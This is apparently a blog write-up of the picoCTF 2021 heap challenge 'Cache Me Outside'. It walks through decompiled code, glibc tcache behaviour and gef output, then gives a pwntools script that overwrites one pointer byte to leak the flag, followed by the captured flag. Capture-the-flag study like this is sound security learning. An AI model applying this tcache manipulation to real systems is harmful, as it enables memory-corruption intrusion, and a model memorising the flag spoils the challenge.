---
title: "picoCTF 2021 - Cache Me Outside"
date: 2022-5-14 00:00:00 +/-0500
categories: [Cybersecurity, CTFs]
tags: [CTF, picoCTF2021, cybersecurity, binary exploit]
---

## Description

While being super relevant with my meme references, I wrote a program to see how
much you understand heap allocations. `nc mercury.picoctf.net 31153 heapedit
Makefile libc.so.6`

Hints: It may be helpful to read a little bit on GLIBC's tcache.

## My Approach

Until this point, I had not done any binary exploits that are related to the
heap. And this challenge gave me a better understanding of heap
allocation/deallocation and how one can try to exploit the glibc heap. 

This
[article](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
was very helpful in understanding how `free()` works. It is very fascinating
there are many different algorithms to optimize the process of freeing memory
space from the heap.

The source code was not given so I used Ghidra to get the source code.


```c

  // Source code for the executable 'heapedit'

  long in_FS_OFFSET;
  undefined val_input;
  int addr_input;
  int local_a4;
  undefined8 *local_a0;
  undefined8 *first_buf;
  FILE *flag_fd;
  undefined8 *second_buf;
  void *local_80; // this is the buffer that has the mem address to the first malloc'd buffer
  undefined8 rand_string;
  undefined8 rand_string_1;
  undefined8 rand_string_2;
  undefined rand_string_nullbyte;
  char flag_buf [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  flag_fd = fopen("flag.txt","r");
  fgets(flag_buf,0x40,flag_fd);
  rand_string = 0x2073692073696874;
  rand_string_1 = 0x6d6f646e61722061;
  rand_string_2 = 0x2e676e6972747320;
  rand_string_nullbyte = 0;
  local_a0 = (undefined8 *)0x0;
  for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    first_buf = (undefined8 *)malloc(0x80);
    if (local_a0 == (undefined8 *)0x0) {
      local_a0 = first_buf;
    }
    *first_buf = 0x73746172676e6f43;
    first_buf[1] = 0x662072756f592021;
    first_buf[2] = 0x203a73692067616c;
    *(undefined *)(first_buf + 3) = 0;
    strcat((char *)first_buf,flag_buf);
  }
  second_buf = (undefined8 *)malloc(0x80);
  *second_buf = 0x5420217972726f53;
  second_buf[1] = 0x276e6f7720736968;
  second_buf[2] = 0x7920706c65682074;
  *(undefined4 *)(second_buf + 3) = 0x203a756f;
  *(undefined *)((long)second_buf + 0x1c) = 0;
  strcat((char *)second_buf,(char *)&rand_string);
  free(first_buf);  // 0x603800
  free(second_buf); // 0x603890
  addr_input = 0;
  val_input = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&addr_input);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&val_input);
  *(undefined *)((long)addr_input + (long)local_a0) = val_input; // local_a0 = 0x6034a0
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10)); // reason for +0x10 is to skip the metadata about the chunk
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
```

When passing in 0, 0 (address, value) as the input to the program, I got this 't
help you: this is a random string.'

```
You may edit one byte in the program.
Address: 0
Value: 0
t help you: this is a random string.
```

After looking at the code, I found out that the part of the string was actually from
a memory space that was freed (started at 0x603890 and the actual string was
from 0x6038a0). And when this line of code 'local_80 = malloc(0x80);' executed,
the memory address that was freed 'free(second_buf)' was reused! When free is
used, due to some optimization choices that the heap manger can use, if
`malloc()` asks for the same size space that can be found in `tcache bin` it
will return the memory address that is at the top of the linked list (the head of
the linked list - so think of this structure as LIFO).

And I realized that (after a long time) we could controll/manipulate what
`malloc()` will return by giving the right inputs to the program. 

And that is possible because, from this line of code '*(undefined
*)((long)addr_input + (long)local_a0) = val_input;', we can see that it tries to
add the input address we pass in to local_a0. And local_a0 has the memory
address to the first buffer of 0x6034a0 'Congrats! Your flag is: ...'. 

Knowing how tcache works, I checked the tcache bins once those two free
functions were called and I could see this:

```
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) 
```


So,

1. the first `free()` frees `0x603800`.

2. the second `free()` frees `0x603890` which is the address to the second_buf
   'Sorry! This won't help you: this is a random string[ ... ].

3. And the last malloc call will return `0x603890` if the size the heap manager
   is looking for matches.

4. the memory address that was freed later is at the top of the linked list
   (LIFO). And the memory address to the first buffer is at the end of the
   linked list.


Since the very last `malloc()` will return the memory address that is the first
chunk in the tcache bin, we want to modify the pointer value which points to (or
have the memory address of) `0x603890`. I had a hard time understanding this at
first but this makes a total sense because it is obvious that the memory address
of `0x603890` is also assigned to a pointer variable. So we need to find the
memory address of this pointer variable (so it can look like `*some_ptr =
0x603890`) and change its value to `0x603800` (since this points to the flag
string). And we would do that by passing appropriate values to overwrite the
pointer and this will return the memory address of `0x603800` when the last `malloc()`
gets called.

Using `search-pattern 0x603890` (I am using `gef` by the way), I could find the
memory address to the variable that holds the memory address of `0x603890`. It is
`0x602088` (so it would look like `*(0x602088) = 0x603890`).

This means `0x6034a0 + X = 0x602088 ---> X = 0x602088 - 0x6034a0 = -5144`.

If you examine the address at 0x602088, you get:

```
0x602088:       0x90    0x38    0x60
```

And this is exactly the memory address that was freed later (at the top of the
tcache bin) and the memory address is stored in the little-endian format. If we
change 0x90 to 0x00, we can have `*(0x602088)` point to `0x603800` which will point
to the flag string!

I wrote a simple script in python:

```python3
import pwn

p = pwn.remote('mercury.picoctf.net', 31153)

address_offset = b'-5144'
byte_to_edit = b'\x00' 

p.sendline(address_offset)
p.sendline(byte_to_edit)

p.interactive()
```

And I got the flag:

```
+] Opening connection to mercury.picoctf.net on port 31153: Done
[*] Switching to interactive mode
You may edit one byte in the program.
Address: Value: lag is: picoCTF{f2d58262f377f31fddf8576b59226f2a}
[*] Got EOF while reading in interactive
```

## Conclusion

I have not entirely understood the whole dynamic of the heap
allocation/deallocation but I now know that I can use the implementation of the
glibc heap to find vulnerabilities. It is very cool to see how there is always a
chance for an exploitation.
